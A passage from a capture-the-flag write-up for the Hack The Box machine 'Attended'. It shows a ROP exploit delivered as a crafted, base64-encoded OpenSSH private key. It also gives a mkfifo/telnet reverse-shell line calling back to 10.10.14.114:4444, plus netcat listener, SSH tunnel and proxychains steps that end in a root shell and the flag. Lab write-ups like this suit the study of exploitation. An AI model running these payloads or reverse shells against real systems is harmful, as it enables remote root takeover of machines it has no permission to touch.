qjiD8t48cNG8rzOS22ppQ0ScqNrhQweFtT+9Z73gGcG4cgaGtyYX7M/H7XqGL3G0RZ0Wfc
t+1N3beK7zR+DKVLs+GEch0c3QkQQNFjnmTfLVPtpbkMGCyzRG9miat2nKvBhXFouS/aJj
4PD66/giPNZ9p6M1t1pbCkshCWYwcLplLCBZ6yo6S+o3jybkGOPuNpV8/kFDo1NOVwQig5
fYCOm2nCbkyHjMk8ML66htkG8eZqBKB1dfGhiRd7ds6YxDUrPz/8O8EY+w2l1jvteAaytr
RHT2cUFNiD5kF8AsEyAZprrsadywjLtT+4HZZ61vKIhiEFuep1mAcuUJDbeFaGSkml2GF0
kG0oxOfn+AYjrLfDlnDQjkyVC1WZhgtQQyjWyu7T/AKMqDIVYpvL3nARrqf4uKEHd3bM8v
D50AAAAOY2hnckBHbGVuc3Rvcm0BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Save this file as an id_rsa and start up a netcat listener:
 
```shell
 ┌──(root💀6baa7852fb51)-[/]
└─# nc -lvp 4444
Listening on 0.0.0.0 4444
```

And now attack our local target with the evil id_rsa.

```shell
┌──(root💀591fd0a9b267)-[/]
└─# ssh -i id_rsa 192.168.17.201
The authenticity of host '192.168.17.201 (192.168.17.201)' can't be established.
ECDSA key fingerprint is SHA256:vtSDkt6z61/Cf4W38fdBjebLyzVVky03HqxnVZ2SKxQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.17.201' (ECDSA) to the list of known hosts.
```

Well what happened there? No prompt back? It hangs or... wait a minute look at our listener!!!

```shell
┌──(root💀6baa7852fb51)-[/]
└─# nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 172.17.0.1 43534
/bin/sh: No controlling tty (open /dev/tty: Device not configured)
/bin/sh: Can't find tty file descriptor
/bin/sh: warning: won't have full job control
foo# /bin/sh: <stdin>[1]: Trying: not found
foo# /bin/sh: <stdin>[2]: Connected: not found
foo# /bin/sh: <stdin>[3]: Escape: not found
foo# whoami
root
foo#
```

It works locally. We can deliver our payload to our local target. Time has come to attack the real target.

## Attacking attendedgw with our binary exploit

First of all, since OpenBSD refused to send the payload with it´s ssh client we need to tunnel our traffic through ssh. Lets setup ssh to tunnel our traffic as a proxy via attended.

```shell
┌──(root💀591fd0a9b267)-[/]
└─# ssh -i /root/.ssh/id_rsa freshness@attended.htb -D 127.0.0.1:8888
Last login: Tue Feb 23 16:32:55 2021 from 10.10.14.114
OpenBSD 6.5 (GENERIC) #13: Sun May 10 23:16:59 MDT 2020

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

attended$
```

That seems to work. Theres now a proxy available at port 8888. We are going to use proxychains to proxy our ssh traffic through the setup ssh tunnel so we need to configure it just a little bit. Change the last line so that we use a the ssh proxy at 127.0.0.1 and port 8888.

```conf
# proxychains.conf  VER 3.1
#
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#

# The option below identifies how the ProxyList is treated.
# only one option should be uncommented at time,
# otherwise the last appearing option will be accepted
#
#dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
strict_chain
#
# Strict - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# all proxies must be online to play in chain
# otherwise EINTR is returned to the app
#
#random_chain
#
# Random - Each connection will be done via random proxy
# (or proxy chain, see  chain_len) from the list.
# this option is good to test your IDS :)

# Make sense only if random_chain
#chain_len = 2

# Quiet mode (no output from library)
#quiet_mode

# Proxy DNS requests - no leak for DNS data
proxy_dns

# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 8000

# ProxyList format
#       type  host  port [user pass]
#       (values separated by 'tab' or 'blank')
#
#
#        Examples:
#
#               socks5  192.168.67.78   1080    lamer   secret
#               http    192.168.89.3    8080    justu   hidden
#               socks4  192.168.1.49    1080
#               http    192.168.39.93   8080
#
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 8888
```

Now change a line in our payload to call back to our HTB interface

```python
head  += b"""/bin/sh\x00-c\x00rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet 10.10.14.114 4444 > /tmp/f\x00                               """                         
```

Run the python program to generate a new key.

```base64
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAEFwAAAAdzc2gtcn
NhAAAAAwEAAQAABAFBQUFBL2Jpbi9zaAAtYwBybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtj
YXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXx0ZWxuZXQgMTAuMTAuMTQuMTE0IDQ0NDQgPi
AvdG1wL2YAICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgILQhwEoAAAAA0iLASgAA
AADaEGAAAAAAAOIQYAAAAAAA5RBgAAAAAAAAAAAAAAAAAGFhYWFiYWFhY2FhYWRhYWFlYW
FhZmFhYWdhYWFoYWFhaWFhYWphYWFrYWFhbGFhYW1hYWFuYWFhb2FhYXBhYWFxYWFhcmFh
YXNhYWF0YWFhdWFhYXZhYWF3YWFheGFhYXlhYWF6YWFiYmFhYmNhYWJkYWFiZWFhYmZhYW
JnYWFiaGFhYmlhYWJqYWFia2FhYmxhYWJtYWFibmFhYm9hYWJwYWFicWFhYnJhYWJzYWFi
dGFhYnVhYWJ2YWFid2FhYnhhYWJ5YWFiemFhY2JhYWNjYWFjZGFhY2VhYWNmYWFjZ2FhY2
hhYWNpYWFjamFhY2thYWNsYWFjbWFhY25hYWNvYWFjcGFhY3FhYWNyYWFjc2FhY3RhYWN1
YWFjdmFhY3dhYWN4YWFjeWFhY3phYWRiYWFkY2FhZGRhYWRlYWFkZmFhZGdhYWRoYWFkaW
FhZGphYWRrYWFkbGFhZG1hYWRuYWFkb2FhZHBhYWRxYWFkcmFhZHNhYWR0YWFkdWFhZHZh
YWR3YWFkeGFhZHlhYWR6YWFlYmFhZWNhYWVkYWFlZWFhZWZhYWVnYWFlaGFhZWlhYWVqYW
Fla2FhZWxhYWVtYWFlbmFhZW9hYWVwYWFlcWFhZXJhYWVzYWFldGFhZXVhYWV2YWFld2Fh
ZXhhYWV5YWFlemFhZmJhYWZjYWFmZGFhZmVhYWZmYWFmZ2FhZmhhYWZpYWFmamFhZmthYW
ZsYWFmbWFhZm5hYWZvYWFmcGFhZnFhYVkRYAAAAAAAbQNAAAAAAABwA0AAAAAAAG0DQAAA
AAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAbQNAAAAAAABwA0AAAAAAAHADQAAAAAAAew
NAAAAAAACAA0AAAAAAAGcDQAAAAAAAYRFgAAAAAAB7A0AAAAAAAIADQAAAAAAAagNAAAAA
AACBEWAAAAAAAM8DQAAAAAAAxwNAAAAAAABhYWFhYmFhYWNhYWFkYWFhZWFhYWZhYWFnYW
FhaGFhYWlhYWFqYWFha2FhYWxhYWFtYWFhbmFhYW9hYWFwYWFhcWFhYXJhYWFzYWFhdGFh
YXVhYWF2YWFhd2FhYXhhYWF5YWFhemFhYmJhYWJjYWFiZGFhYmVhYQAADkjeej6c3no+nA
AAAAdzc2gtcnNhAAAEAQDpnTPpsPytTpEIFtsA8TZBdNvmArq6qnacMi2MVYQ38OG4feKU
Hnn2VYHv1WZTdbbsFlaQIqAJ/Vlegklz9DQSEoJCgEB9R00qL3EW7JQ9UyyeWcr3Kh5thT
ZLnZ+mJJddG340QvBrD3V1Dzfb6Gl2QZ5xifHinBf1AAUq/qOa3uapO5jseIGyR08wIpWU
+qo/TB10kDM1JPfU0lFnNtjdo/3nf6ZF9pASa8A9GfMAwCmivX4uMhys94ltkZ5W5To40j
4uvJTan0N+qyr9Ao2luhCGUiQ1tRgUTf1576TtttOArOZok9AY6d7txwqPhVNoKbkfrKpn
cHgOyXv1ylG/iLZxsGd43X6BBY8Fvb7dPABQa0c9oby1HM1ImtCLQZtVnHSvJe5MmI22sa
FOnBQ9fOjEBO/ksRZfxUMr5sh6taXoXvtTrMcLA0WGYoG56clNJMYFDo0QdPViGk2iB4+k
v1pfJbWUpG5hc12s/NlK9UlaYpA2rfzBzHw50tYa2py/NhHq1URTq+H+1RBpS1jXaZdobR
ygayjkdOLDzgvasmyD9Sjc+15IBWvpiQEOPJnKffrnXkpFvgYxl48yU3BU/DVe2yAf5N92
wHC8p8rYlpShUPMUDeIpkSJuu1GqCaQvso8zaqOU8ApYGlOYY9AltloTyXwkJNGE6JefrM
54aQeARfRIuPPWVjkQyFqxzNvNmvZobIakW4qUY8/M9DvF6YoQlTHXBj9rUTsQ+7r1cNSR
tTSPocCzep/fD41Jvpoik847UHPwZiEQFpCEXzwPP7hiZ+Hgx68mKuRIvBOwXb+AmSYCI8
BgvVjRmAGzGfrUfgz1msWscFAKJPGAL+n/58WmNKgQPkC5IaEoClBsVA7dqAyrFXr+K40R
c8ubpcuowULvkXidcr8YZBg2E2z2FqaR5gDWOalesSipTX9hWhbzQOWii/kQJJMiv2bKAV
4557HudctaBCBUcMLJdI6rWgMLqzDUZYsw7Bpdz8ZpOCHiTAgz/Ts7nl4hlZ4bQeIeqTtk
PgOmSnkEhZ4BhuH3ZgdnL7pE7X+fpT/kOpn8ma6eSO1cDCq3RCaOgzHc+Kd3enLIvCgXyC
SO5HuA2ed1pVIDPPumB8B9+vXFUJ4BZiQL1dKWrHqoLUkbEPFHY4b9wOrTZepSqH7uIo6T
18kg52FLtzyS4/ie8fYzWnVO2dUIL5ZKYIM9SrlUT1DHEXzD83+bmyDRoBAs+gj9ig7yX1
Bsbd/rNg2rnkcSh4ykGka4hmJQDCz6UCeNN/Vl4YpUAhZTNRRQqtA1TT9MSmVsxHv5SrBW
UZtMI9gkEjfaILf9VhI2VSoH7UPsnr0ihrzoy+ec2AHHlkLqFMaMG10ZAAAAAwEAAQAABA
ByBXNYBTVelTE+ZIFh1Vlo21OU0RI4l4iqteb7TqXo894HwRF8v99BNvzjhSGbbKHqWwDG
+s9n8MrU0Pxu5usfQv9m29geDVYBWAR3buLvh5AIfcUNm/Yb+F/Gylkoq0VhgVC4y08ywe
nPR6043RfUSzS9L9nqg8tBnk/naz+JEHA+e0Mpb6vFyv5AfTDK9QlxOYJK6TLFJpT7v+dR
XDi+/RKpEemizjQFeafraqXrYN8xehGDFJxgY7Uk0GUa/mjLYPpOr2Zryj4ULhEeSke+cr
EsDh10RT5KcsJb6HZ0O77BWCJhOnvgHQ3cukBSSn2qImsjpY/KSt+eQAMLtULvHBgIJ1Rp
bpoW+RKUd8cXjfiNR78OuskzEKq1XDKbNVtOjr142yeTJQZN/CbCCnXqiPPG8K3xzekgt1
QQsmR5V/1xDCLY9UR1AJTHgX7VseC5kVBBGZgKRzuZNUNc6RnYDDlcpTgaI6NoVvmKvCKG
bm/t+JtwxLzQDjE3u8sackb9ILPgDVV7DTKRwYZwDgF/qh7nLhJBzeu4jcA8V237wQgr49
Wc/edHebXw1xi3zSY26gQzNxdDMPsu601N/+Gc6ThXYtYsGvZirIyZ17+utNg4YB00VY5k
QV0v9KdoOap0SU+RhePvhrVVyQuyHk1yiq0uaTH5JitJFokiuyJPK+1l/oYrUPiCDPrIJi
WOGU25RQUkAIgjOpRPjbt6lmUHUcbyGo5zliboaad1uq5fw0Xyv9xO4O6CCErahfN6bVFB
z4xbf1GedmltCHotUvIU60r+uzMobDXgWSNvZgUN/HN+K7E3TgauIX71xbGDSFG27NBV4w
Hgobu2eao+55DTXU/tUwq5mdKJRnNRxAY0ajTGtY6q/o5drPBdWS8qdfkQn/wvDMiSFbUJ
F1GhRXCngROYPyeNYlq+DrayAeWwdHDdf3yHqrE8oM3a79Oz6gOxMMDQssPzOTvldR7MnP
Nh6Zl3i+RRd5fpngPIztgI6UhkxmB4E9DnaLgHerxjBJFNHPaPwFIobs/m6RrNDW+/YlAE
6cL9UaM/73wqLqvOnV3T0DwBzNROSKYglAUHGbIoWrRY1nUiFuTnyr7KtdlqwQNDT1XSe+
3y40VLyHiNlPQ4BDBtHAj5vZG3sgF2ya8FY8oSAomhZC9iFKbf4UgppWiIEKOUySGqu4Be
OYR+JZ0tjp6xqMhwqO0UETqn3He1sQfXGw8pVZ80q2nUutTbEOz+zBKaH49+VtaLZhyedR
I07R1nlRSKq+zeWHcdCWSESfSqYjvokZcm+s3PDfnZgKR1JNFev/WoQR2UBvtBHqPpIBVT
WR/J4jja96+PF8azq+7X5/Y3tuk3lR3IVXlxAAACADkBeXYpSxLtmgeqGVRUEDLs4m5lR+
ID/Qx/2TnFUC/5CVvcMGsFh8vbyDKM+JsNFThorc34r2LUH9kLiNjNmNK9/5/inFC0Z9UN
D0Io/xKqpjtYtBtiOGlvK0aBu56h1ITU1e8FQEqE2r34RDgPSs/aXFV+FlXrMhDCXQSLCW
k2ZQzw+wnkKsKy9wEQp/SSojWXNjDHlf1xHp5PzjGHTnZE72Pht7tziLPMA33kR5ExNuoA
GzdDTDCtB+8kpnVqwlJv/rnfDgSAR3zUnFv98a832+s1S5CT9ztVdm4yaMxFYQSeHBTMLa
P3S6KkgZaZp26Et3K2OtvVnI9k4iL8ZcLfICZW80gqpeK+iyuY3L1cW32NJMlZbTN5fcTk
NUs3dB/9YIntbsSgiU4A0kKNrQ18yiY7PzYqO0v7eKgBxWgVHxQ5et974/PmbG1zBQ6ku3
gi6JzQ4YcB8rhLIMdL0tbrz0nEdEKHGkaj64TiknETVvLekpCOVhecz9pLVz5mBpFrQKvz
MpKpeu/SaMzVVNiaTg5gQ5jxSGgFhRZpUaK/E0uMG2FfPle1PGj314mypXB9WjdbnMTD0+
G0VPSF0BiZagUM8a2EUsnxqh4IF8IlvX+Jfy+jeT3hc34EddroQUHC9oHQj9OGPdpnU/Ea
kVIMwBX9nmQ2SSu32nhEgQ9/AAACAQD44YWhvY7AEdr9RMWr6nW6ZVEtR8N5AOhWHgDGia
CvL9uvuGeW/a9V+v+ozmBoUwpEoQZgIBz8CuZxXEr9I7TZDdvpfaa9mBO8bWuhx9NQqpTR
kRfKK//W7h9rfPbVoAVR3xmacn3Wysow5SjXCmCaJjpnJtSY9OOkL4zYkh8R27vXjYbu5x
WSNbcqowbuoGGPduYXTOeNTcJMBFG9gAk72n3VMueS9i/JRgze/qF/iQRKC4OsXlltVEea
ZD7+cut+UT040/HQ4fpckPFw5aBJTja7KbYjrFZK2fej0zw8+D2gtMnr/NebN7AINH5F05
wMNbb4iSZDDvd8AnRZ1JDVuXJhKQM7xjugTyISxnWiwcvS+Z4JzzrcdKVXFgCi5070YOLw
VXW5ZZqaeH18Sl4hJ4KO7hmbZd6qZIDPX1mUZtENpuiPdSV0VlPwF4pRPXbRDXFVdB3SdG
r13+6kqRwzKTDHrgYQQBgf9H/OGu3g66uJ5KGDm1gctNEThXYcdnWPjq8kI/1U5HIcHo6c
PlL25cLJuAJJw2TgZJLxzKkWEMGd5k2RyoJOU45MTVH2j/0L4KeoYRlU/SDEAusYVg5kaX
h0PeKoz3YBb5OoalGkQ4+mzZrVrZSS0qRz01WTMYtXi6FbtBvoe88gOtNXz/xvYI0FRfgO
V5HeL38oy2QQrQAAAgEA8Evi3wSY2TwLyiZT5u9+aXCnVyMYkcg2EmAjMaktP6lDctTTI8
Jr3lFVY9ByfUe39zS4WGEaVHH5aGA0Dm3J9G/QGh07e4nzI6lVzuzYXw6rbjdopcA6+A80
QApmeOllxhoQ0zjmH2X6GBMyXyUEFolhi7YlNxWG27IWLs5oDMVvnoXiGqrQsV6mJ4qxWV
NiC6KSP4Fuk2soFVPF+Tz76IRYT4hMdEOsxS//+3d+ltTR7SxRSN4Dn7fGbW04YQspozzX
qjiD8t48cNG8rzOS22ppQ0ScqNrhQweFtT+9Z73gGcG4cgaGtyYX7M/H7XqGL3G0RZ0Wfc
t+1N3beK7zR+DKVLs+GEch0c3QkQQNFjnmTfLVPtpbkMGCyzRG9miat2nKvBhXFouS/aJj
4PD66/giPNZ9p6M1t1pbCkshCWYwcLplLCBZ6yo6S+o3jybkGOPuNpV8/kFDo1NOVwQig5
fYCOm2nCbkyHjMk8ML66htkG8eZqBKB1dfGhiRd7ds6YxDUrPz/8O8EY+w2l1jvteAaytr
RHT2cUFNiD5kF8AsEyAZprrsadywjLtT+4HZZ61vKIhiEFuep1mAcuUJDbeFaGSkml2GF0
kG0oxOfn+AYjrLfDlnDQjkyVC1WZhgtQQyjWyu7T/AKMqDIVYpvL3nARrqf4uKEHd3bM8v
D50AAAAOY2hnckBHbGVuc3Rvcm0BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Save the key in an id_rsa file and kick try to send it thorug the tunnel.

```shell
┌──(root💀591fd0a9b267)-[/]
└─# proxychains3 ssh -i id_rsa root@192.168.23.1 -p 2222
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8888-<><>-192.168.23.1:2222-<><>-OK
```

Looks like we succeeded. Now let´s see what is happening at the listener.

```shell
┌──(root💀6baa7852fb51)-[/]
└─# nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 172.17.0.1 43574
/bin/sh: No controlling tty (open /dev/tty: Device not configured)
/bin/sh: Can't find tty file descriptor
/bin/sh: warning: won't have full job control
attendedgw# /bin/sh: <stdin>[1]: Trying: not found
attendedgw# /bin/sh: <stdin>[2]: Connected: not found
attendedgw# /bin/sh: <stdin>[3]: Escape: not found
attendedgw# whoami
root
attendedgw# cd /root
attendedgw# ls
.Xdefaults
.cshrc
.cvsrc
.forward
.login
.profile
.ssh
root.txt
attendedgw# cat root.txt
1986e8537a05420f0d59263f04dcd48a
```

VICTORY!!! We have a shell and we are root. 

## Summary

That was a hell of a ride. There were two places where I was stuck for days. The first one was after obtaining foothold. It took quite some time to find that ProxyCommand thing and I tried a lot of other things before that. I also sent a lot of mails before deciding to fix a http reverse shell. 

The second thing was developing the ROP gadget chain. That was pure pain. What worked in gdb stopped working as soon as I changed a byte in the payload or when I removed breakpoints. Ofcourse it did not work as soon as I left gdb. At the end I was developing by setting a ret address to 0x0000000000000000 in the gadget chain to make gdb stop at that point. As soon as I added a breakpoint things changed totally. But when I got it to work without break points it started to work outside gdb aswell. Though when I went back it suddenly did not work inside gdb. I never really figured this out and I would **really** like to understand this issue to avoid all this headache in the future.

In the end I had a payload that did not crash but still did not work. First I had made a misstake and switched parameters in rdi and rsi. When that was fixed I got some feedback in the shell and I spend  many hours with ktrace and kdump before I realised that I forgot to send '/bin/sh' as the first argument in the list of arguments (parg). I felt a bit of rusty with this binary exploitation. It´s been a while but I really like so I hope there will be more boxes like this.

I like when the boxes are as close to real life as possible and not too CTF-like. The mailing part in this one was a bit farfetched, but still very good. That mailing back and forth would never have taken place in real life but afterall it´s about learning and I think it played it´s part well. There has been a few insane boxes and hard where the logic is like... nahhhhh that is just stupid. But this one was not like that, one of the abolutley best at the insane level.
